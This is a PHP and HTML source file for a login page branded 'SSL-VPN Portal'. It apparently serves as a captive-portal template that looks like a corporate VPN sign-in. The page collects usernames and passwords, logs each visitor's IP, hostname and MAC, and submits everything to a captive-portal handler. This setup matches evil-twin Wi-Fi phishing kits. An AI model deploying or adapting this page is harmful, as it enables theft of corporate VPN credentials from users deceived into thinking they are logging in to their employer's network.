<?php
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ip       = $_SERVER['REMOTE_ADDR'];
$mac      = $_SERVER['HTTP_X_CLIENT_MAC'] ?? '';
$target   = $_GET['target'] ?? '/';
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SSL-VPN Portal Login</title>

<style>
/* ===== GLOBAL ===== */
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: Arial, Helvetica, sans-serif;
}

body {
    background: #efefef;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    overflow: hidden;
}

/* ===== DECORATIVE SHAPES ===== */
.left-block {
    position: absolute;
    left: 60px;
    top: 180px;
    width: 160px;
    height: 240px;
    background: linear-gradient(180deg,#5d88c7,#7aa0d1);
}

.right-block {
    position: absolute;
    right: 120px;
    top: 60px;
    width: 130px;
    height: 220px;
    background: #8e6cc4;
    border-bottom-left-radius: 40px;
}

.bottom-bar {
    position: absolute;
    bottom: 120px;
    left: 40px;
    width: 120px;
    height: 20px;
    background: #999;
}

.dots {
    position: absolute;
    right: 80px;
    bottom: 80px;
    width: 140px;
    height: 120px;
    background-image: radial-gradient(#bbb 1px, transparent 1px);
    background-size: 14px 14px;
}

/* ===== LOGIN BOX ===== */
.container {
    width: 420px;
    text-align: center;
}

h1 {
    font-size: 48px;
    font-weight: bold;
    margin-bottom: 10px;
}

.subtitle {
    font-size: 28px;
    color: #333;
    margin-bottom: 40px;
    position: relative;
}

.subtitle:before,
.subtitle:after {
    content: "";
    position: absolute;
    top: 50%;
    width: 80px;
    height: 1px;
    background: #aaa;
}

.subtitle:before {
    left: -100px;
}

.subtitle:after {
    right: -100px;
}

/* ===== INPUTS ===== */
input[type="text"],
input[type="password"] {
    width: 100%;
    padding: 12px;
    margin-bottom: 15px;
    border: 1px solid #cfcfcf;
    background: #f7f7f7;
    font-size: 16px;
}

/* ===== BUTTON ===== */
button {
    width: 100%;
    padding: 14px;
    background: #d93025;
    border: none;
    color: white;
    font-size: 18px;
    cursor: pointer;
    transition: background 0.2s ease;
}

button:hover {
    background: #b5251d;
}

/* ===== RESPONSIVE ===== */
@media (max-width: 600px) {
    .container {
        width: 90%;
    }

    h1 {
        font-size: 36px;
    }

    .subtitle {
        font-size: 22px;
    }
}
</style>

</head>
<body>

<div class="left-block"></div>
<div class="right-block"></div>
<div class="bottom-bar"></div>
<div class="dots"></div>

<div class="container">
    <h1>SSL-VPN Portal</h1>
    <div class="subtitle">Login</div>

    <form method="POST" action="/captiveportal/index.php">

        <input type="text"
               name="username"
               placeholder="Username"
               required>

        <input type="password"
               name="password"
               placeholder="Password"
               required>

        <!-- Hidden captive portal fields -->
        <input type="hidden" name="hostname" value="<?= htmlspecialchars($hostname) ?>">
        <input type="hidden" name="ip" value="<?= htmlspecialchars($ip) ?>">
        <input type="hidden" name="mac" value="<?= htmlspecialchars($mac) ?>">
        <input type="hidden" name="target" value="<?= htmlspecialchars($target) ?>">

        <button type="submit">Login</button>
    </form>
</div>

</body>
</html>
